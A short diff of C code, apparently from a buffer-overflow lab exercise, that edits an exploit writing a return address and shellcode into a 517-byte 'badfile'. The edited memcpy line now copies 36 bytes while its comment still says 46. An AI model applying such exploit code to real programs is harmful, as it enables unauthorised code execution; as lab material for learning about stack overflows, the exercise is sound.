@@ -17,7 +17,7 @@ main() {
     p = (int *)(addr);
     *p=0xbfffff9b;	//  put the new function return right below it
     /* we dont need to NoOP sled with this exploit */
-    memcpy(&buffer[, &shellcode, strlen(shellcode) + 46)  //  shellcode + 46 bytes for the addr, buf and pointer
+    memcpy(&buffer, &shellcode, strlen(shellcode) + 36)  //  shellcode + 46 bytes for the addr, buf and pointer
     // memcpy(&buffer[100], &shellcode, strlen(shellcode));
     //execle("./stack",shellcode,buf,addr,0,0);  //  execute with our stack configuration
     fwrite(buffer, 517, 1, badfile);
